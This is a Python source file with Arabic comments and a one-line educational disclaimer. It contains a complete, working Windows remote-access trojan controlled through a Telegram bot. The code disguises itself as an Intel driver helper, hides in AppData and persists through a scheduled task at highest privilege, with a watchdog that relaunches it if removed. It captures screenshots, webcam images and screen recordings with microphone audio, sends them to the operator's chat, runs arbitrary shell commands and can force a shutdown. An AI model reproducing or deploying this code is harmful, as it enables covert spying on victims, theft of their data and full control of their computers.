# WARNING: This code is for educational use only.
# Do not use it without proper authorization.

import os
import sys
import subprocess
import shutil
import time
import requests
import ctypes
import psutil
import logging
import pyautogui
import cv2
import sounddevice as sd
import numpy as np
from threading import Thread
from scipy.io.wavfile import write as write_wav

# =============== إعدادات أساسية ===============
APPDATA = os.getenv('APPDATA')
TARGET_DIR = os.path.join(APPDATA, 'Intel', 'drivers')
TARGET_EXE = os.path.join(TARGET_DIR, 'winhelper32.exe')
TASK_NAME = "IntelDriverHelperSvc"
EXECUTED_COMMANDS_FILE = os.path.join(TARGET_DIR, 'executed_commands.txt')

# =============== إعداد اللوق ===============
os.makedirs(TARGET_DIR, exist_ok=True)
log_path = os.path.join(TARGET_DIR, 'logs.txt')
logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# =============== إعداد بوت تليجرام ===============
TOKEN = ""
CHAT_ID = ""
URL = f"https://api.telegram.org/bot{TOKEN}"

# =============== فنكشن ===============
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def send_message(text):
    try:
        requests.post(f"{URL}/sendMessage", data={'chat_id': CHAT_ID, 'text': text})
    except Exception as e:
        logging.error(f"Telegram error: {e}")

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"{URL}/sendDocument", files={'document': f}, data={'chat_id': CHAT_ID})
    except Exception as e:
        logging.error(f"Send file error: {e}")

def silently_copy(src, dst):
    try:
        subprocess.run(f'copy "{src}" "{dst}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def check_single_instance():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\IntelDriverHelperMutex")
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)

def install_persistence():
    if not os.path.exists(TARGET_EXE):
        silently_copy(sys.executable, TARGET_EXE)
    try:
        result = subprocess.run(["schtasks", "/Query", "/TN", TASK_NAME], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result.returncode != 0:
            subprocess.run(["schtasks", "/Create", "/F", "/SC", "ONLOGON", "/RL", "HIGHEST", "/TN", TASK_NAME, "/TR", TARGET_EXE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            send_message("🛡️ Persistence Installed")
        else:
            logging.info("Persistence already exists.")
    except Exception as e:
        logging.error(f"Install persistence error: {e}")
        send_message(f"❌ Persistence Error")

def watchdog():
    while True:
        if not os.path.exists(TARGET_EXE):
            silently_copy(sys.executable, TARGET_EXE)
            subprocess.Popen(TARGET_EXE, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(20)

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='replace')
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors='replace')

def capture_screenshot():
    try:
        file_path = os.path.join(TARGET_DIR, 'screenshot.png')
        pyautogui.screenshot().save(file_path)
        return file_path
    except:
        return None

def capture_webcam(index=0):
    try:
        file_path = os.path.join(TARGET_DIR, f'webcam_{index}.jpg')
        cam = cv2.VideoCapture(index)
        ret, frame = cam.read()
        cam.release()
        if ret:
            cv2.imwrite(file_path, frame)
            return file_path
    except:
        return None

def record_screen_with_audio(duration=10):
    try:
        width, height = pyautogui.size()
        video_path = os.path.join(TARGET_DIR, 'record.avi')
        audio_path = os.path.join(TARGET_DIR, 'audio.wav')
        out = cv2.VideoWriter(video_path, cv2.VideoWriter_fourcc(*"XVID"), 10, (width, height))
        audio = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
        sd.wait()
        start_time = time.time()
        while time.time() - start_time < duration:
            frame = np.array(pyautogui.screenshot())
            out.write(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        out.release()
        write_wav(audio_path, 44100, audio)
        return video_path, audio_path
    except:
        return None, None

def has_command_been_executed(cmd):
    if not os.path.exists(EXECUTED_COMMANDS_FILE):
        return False
    with open(EXECUTED_COMMANDS_FILE, 'r') as f:
        commands = f.read().splitlines()
    return cmd in commands

def mark_command_as_executed(cmd):
    with open(EXECUTED_COMMANDS_FILE, 'a') as f:
        f.write(cmd + '\n')

# =============== الماين ===============
def main():
    check_single_instance()
    install_persistence()
    Thread(target=watchdog, daemon=True).start()
    send_message("💻 Client Ready")

    last_update = None
    processed_updates = set()

    while True:
        try:
            updates = requests.get(URL + "/getUpdates", params={'timeout': 100, 'offset': last_update}).json()
            for item in updates.get("result", []):
                update_id = item["update_id"]
                last_update = update_id + 1

                if update_id in processed_updates:
                    continue
                processed_updates.add(update_id)

                message = item.get("message", {})
                if str(message.get("chat", {}).get("id")) != CHAT_ID:
                    continue

                cmd = message.get("text", "").strip()
                if has_command_been_executed(cmd):
                    send_message("⛔ Command already executed before.")
                    continue
                mark_command_as_executed(cmd)

                if cmd.lower() == "/screenshot":
                    path = capture_screenshot()
                    if path: send_file(path)
                elif cmd.lower().startswith("/webcam"):
                    try:
                        cam_num = int(cmd.split(" ")[1])
                        path = capture_webcam(cam_num)
                        if path: send_file(path)
                    except:
                        send_message("⚠️ Usage: /webcam 0")
                elif cmd.lower().startswith("/recordscreen"):
                    parts = cmd.split(" ")
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    vpath, apath = record_screen_with_audio(duration)
                    if vpath: send_file(vpath)
                    if apath: send_file(apath)
                elif cmd.lower() == "/shutdown":
                    send_message("⚡ Shutting down...")
                    subprocess.run("shutdown /s /f /t 0", shell=True)
                else:
                    result = execute_command(cmd)
                    send_message(result)
        except Exception as e:
            logging.error(f"Main loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
